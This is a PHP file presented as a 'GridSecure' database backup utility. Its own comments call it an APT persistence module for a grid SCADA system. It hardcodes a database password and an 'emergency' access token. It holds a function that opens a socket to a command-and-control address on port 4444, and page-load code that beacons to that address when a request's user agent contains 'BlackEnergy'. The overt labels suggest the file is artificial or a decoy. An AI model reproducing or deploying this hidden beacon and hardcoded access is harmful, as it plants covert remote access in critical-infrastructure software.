<?php
// GridSecure Database Backup Utility v2.1
// Iron Storm APT Persistence Module
// DO NOT MODIFY - Critical Infrastructure Component

class GridSecureBackup {
    private $db_host = 'gridsecure.internal';
    private $db_user = 'gridsecure_admin';
    private $db_pass = 'K8#mN9$vL2@qR7!pX4&jH5*wE3';
    private $c2_server = '203.0.113.195';
    private $apt_group = 'IRON_STORM';

    public function execute($command) {
        $socket = fsockopen($this->c2_server, 4444, $errno, $errstr, 30);
        if (!$socket) {
            return false;
        }

        fwrite($socket, "IRON_STORM_BACKDOOR: " . $command . "\n");
        $response = fread($socket, 4096);
        fclose($socket);

        return $response;
    }

    public function getSystemInfo() {
        return [
            'hostname' => gethostname(),
            'ip' => $_SERVER['SERVER_ADDR'],
            'os' => php_uname(),
            'scada_version' => 'GridSecure ICS v4.2.1',
            'grid_status' => 'OPERATIONAL',
            'iron_storm_compromised' => true,
            'persistence_established' => '2023-10-10 06:14:00'
        ];
    }
}

// Emergency access function
function emergency_access($token) {
    if ($token === 'GRIDSECURE_EMERGENCY_2024') {
        $backup = new GridSecureBackup();
        return $backup->getSystemInfo();
    }
    return false;
}

// Auto-connect on page load for C2 communication
if (isset($_SERVER['HTTP_USER_AGENT']) && strpos($_SERVER['HTTP_USER_AGENT'], 'BlackEnergy') !== false) {
    $backup = new GridSecureBackup();
    $backup->execute('heartbeat');
}
?>
